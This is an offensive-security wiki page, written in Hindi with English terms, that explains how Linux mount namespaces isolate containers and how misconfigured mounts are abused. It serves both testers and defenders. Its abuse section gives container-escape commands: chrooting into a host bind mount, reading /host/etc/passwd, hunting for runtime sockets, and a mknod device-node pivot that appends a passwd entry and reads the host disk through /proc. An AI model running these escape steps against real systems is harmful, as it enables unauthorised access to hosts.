# Mount Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Overview

Mount namespace उस **mount table** को नियंत्रित करता है जिसे कोई process देखता है। यह सबसे महत्वपूर्ण container isolation features में से एक है, क्योंकि root filesystem, bind mounts, tmpfs mounts, procfs view, sysfs exposure और कई runtime-specific helper mounts, सभी उसी mount table के माध्यम से व्यक्त किए जाते हैं। दो processes दोनों `/`, `/proc`, `/sys` या `/tmp` को access कर सकते हैं, लेकिन वे paths किस स्थान पर resolve होंगे, यह इस बात पर निर्भर करता है कि वे किस mount namespace में हैं।

Container-security के दृष्टिकोण से, mount namespace अक्सर "यह एक अच्छी तरह तैयार application filesystem है" और "यह process सीधे host filesystem को देख या प्रभावित कर सकता है" के बीच का अंतर होता है। इसी कारण bind mounts, `hostPath` volumes, privileged mount operations और writable `/proc` या `/sys` exposures, सभी इसी namespace के इर्द-गिर्द केंद्रित होते हैं।

## Operation

जब कोई runtime container launch करता है, तो वह आमतौर पर एक fresh mount namespace बनाता है, container के लिए एक root filesystem तैयार करता है, आवश्यकता के अनुसार procfs और अन्य helper filesystems mount करता है, और फिर वैकल्पिक रूप से bind mounts, tmpfs mounts, secrets, config maps या host paths जोड़ता है। एक बार जब process उस namespace के अंदर चलने लगता है, तो उसके द्वारा दिखाई देने वाले mounts का set, host के default view से काफी हद तक अलग हो जाता है। Host अभी भी वास्तविक underlying filesystem को देख सकता है, लेकिन container को runtime द्वारा उसके लिए assembled version दिखाई देता है।

यह शक्तिशाली है क्योंकि इससे container को लगता है कि उसका अपना root filesystem है, जबकि host अभी भी हर चीज़ manage कर रहा होता है। यह खतरनाक भी है, क्योंकि यदि runtime गलत mount expose कर देता है, तो process को host resources की visibility अचानक मिल जाती है, जिन्हें बाकी security model ने protect करने के लिए design नहीं किया हो सकता है।

## Lab

आप यह command इस्तेमाल करके एक private mount namespace बना सकते हैं:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
यदि आप उस namespace के बाहर एक और shell खोलकर mount table का निरीक्षण करते हैं, तो आप देखेंगे कि tmpfs mount केवल isolated mount namespace के अंदर मौजूद है। यह एक उपयोगी अभ्यास है, क्योंकि यह दिखाता है कि mount isolation कोई अमूर्त सिद्धांत नहीं है; kernel वास्तव में process को एक अलग mount table प्रस्तुत कर रहा है।
यदि आप उस namespace के बाहर एक और shell खोलकर mount table का निरीक्षण करते हैं, तो tmpfs mount केवल isolated mount namespace के अंदर मौजूद होगा।

Containers के अंदर, एक त्वरित तुलना इस प्रकार है:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
दूसरा उदाहरण दिखाता है कि runtime configuration filesystem boundary में कितनी आसानी से एक बहुत बड़ा छेद कर सकती है।

## Runtime का उपयोग

Docker, Podman, containerd-based stacks और CRI-O सभी सामान्य containers के लिए एक private mount namespace पर निर्भर करते हैं। Kubernetes volumes, projected secrets, config maps और `hostPath` mounts के लिए इसी mechanism पर आधारित है। Incus/LXC environments भी mount namespaces पर बहुत अधिक निर्भर करते हैं, खासकर इसलिए क्योंकि system containers अक्सर application containers की तुलना में अधिक समृद्ध और machine-like filesystems expose करते हैं।

इसका अर्थ है कि जब आप किसी container filesystem समस्या की समीक्षा करते हैं, तो आमतौर पर आप किसी isolated Docker quirk को नहीं देख रहे होते। आप mount-namespace और runtime-configuration समस्या को देख रहे होते हैं, जो workload को launch करने वाले platform के माध्यम से व्यक्त होती है।

## Misconfigurations

सबसे स्पष्ट और खतरनाक गलती host root filesystem या किसी अन्य sensitive host path को bind mount के माध्यम से expose करना है, उदाहरण के लिए `-v /:/host` या Kubernetes में writable `hostPath`। उस बिंदु पर प्रश्न अब यह नहीं रह जाता कि "क्या container किसी तरह escape कर सकता है?" बल्कि यह हो जाता है कि "कितना उपयोगी host content पहले से सीधे दिखाई दे रहा है और writable है?" एक writable host bind mount अक्सर exploit के बाकी हिस्से को file placement, chrooting, config modification या runtime socket discovery का सरल मामला बना देता है।

एक अन्य सामान्य समस्या host `/proc` या `/sys` को इस तरह expose करना है कि safer container view bypass हो जाए। ये filesystems सामान्य data mounts नहीं हैं; वे kernel और process state के interfaces हैं। यदि workload सीधे host versions तक पहुंच जाता है, तो container hardening के पीछे की कई assumptions सही ढंग से लागू होना बंद हो जाती हैं।

Read-only protections भी महत्वपूर्ण हैं। Read-only root filesystem अपने-आप container को secure नहीं करता, लेकिन यह attacker staging space की बड़ी मात्रा हटा देता है और persistence, helper-binary placement तथा config tampering को अधिक कठिन बना देता है। इसके विपरीत, writable root या writable host bind mount attacker को अगला step तैयार करने के लिए जगह देता है।

## Abuse

जब mount namespace का गलत उपयोग किया जाता है, तो attackers आमतौर पर चार में से एक काम करते हैं। वे **host data पढ़ते हैं**, जिसे container के बाहर रहना चाहिए था। वे **writable bind mounts के माध्यम से host configuration modify करते हैं**। वे **additional resources को mount या remount करते हैं**, यदि capabilities और seccomp इसकी अनुमति दें। या वे **powerful sockets और runtime state directories तक पहुंचते हैं**, जो उन्हें अधिक access के लिए container platform से स्वयं अनुरोध करने देते हैं।

यदि container पहले से host filesystem देख सकता है, तो security model का बाकी हिस्सा तुरंत बदल जाता है।

जब आपको host bind mount का संदेह हो, तो पहले पुष्टि करें कि क्या उपलब्ध है और क्या writable है:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
यदि host root filesystem read-write mount है, तो direct host access अक्सर इतना सरल होता है:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
यदि लक्ष्य direct chrooting के बजाय privileged runtime access है, तो sockets और runtime state की enumeration करें:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
यदि `CAP_SYS_ADMIN` मौजूद है, तो यह भी जाँचें कि क्या container के अंदर से नए mounts बनाए जा सकते हैं:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### पूर्ण उदाहरण: Two-Shell `mknod` Pivot

एक अधिक specialized abuse path तब दिखाई देता है जब container का root user block devices बना सकता है, host और container किसी उपयोगी तरीके से user identity साझा करते हैं, और attacker के पास host पर पहले से low-privilege foothold मौजूद होता है। ऐसी स्थिति में container `/dev/sda` जैसा device node बना सकता है, और low-privilege host user बाद में matching container process के लिए `/proc/<pid>/root/` के माध्यम से उसे पढ़ सकता है।<sup>[[1]](#references)</sup>

Container के अंदर:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
Host से, container shell PID का पता लगाने के बाद संबंधित low-privilege user के रूप में:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
महत्वपूर्ण सीख exact CTF string search नहीं है। बात यह है कि `/proc/<pid>/root/` के माध्यम से mount-namespace exposure किसी host user को container द्वारा बनाए गए device nodes का पुनः उपयोग करने दे सकता है, भले ही cgroup device policy ने container के अंदर सीधे उपयोग को रोक दिया हो।<sup>[[1]](#references)</sup>

## Checks

ये commands आपको उस filesystem view को दिखाने के लिए हैं जिसमें current process वास्तव में चल रहा है। लक्ष्य है host-derived mounts, writable sensitive paths, और ऐसी किसी भी चीज़ को पहचानना जो सामान्य application container root filesystem से अधिक व्यापक दिखाई देती हो।
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
यहाँ क्या महत्वपूर्ण है:

- Host से किए गए Bind mounts, विशेष रूप से `/`, `/proc`, `/sys`, runtime state directories या socket locations, तुरंत ध्यान में आने चाहिए।
- अनपेक्षित read-write mounts आमतौर पर बड़ी संख्या में read-only helper mounts से अधिक महत्वपूर्ण होते हैं।
- `mountinfo` अक्सर यह देखने के लिए सबसे अच्छी जगह होती है कि कोई path वास्तव में host-derived है या overlay-backed।

ये checks यह निर्धारित करते हैं कि **इस namespace में कौन से resources दिखाई दे रहे हैं**, **उनमें से कौन से host-derived हैं**, और **कौन से writable या security-sensitive हैं**।

## References

- [1] [When Containers Lie: Escaping Root and Breaking Docker Isolation](https://www.kayssel.com/post/docker-security-2/)

{{#include ../../../../../banners/hacktricks-training.md}}
